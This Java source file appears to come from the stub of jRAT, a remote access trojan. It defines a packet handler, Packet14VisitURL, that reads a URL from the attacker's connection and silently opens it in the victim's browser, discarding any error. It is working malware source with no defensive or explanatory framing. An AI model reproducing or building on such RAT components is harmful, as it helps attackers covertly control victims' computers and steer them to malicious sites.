package se.jrat.stub.packets.incoming;

import java.net.URI;

import se.jrat.stub.Connection;


public class Packet14VisitURL extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		try {
			java.awt.Desktop.getDesktop().browse(new URI(url));
		} catch (Exception ex) {

		}
	}

}
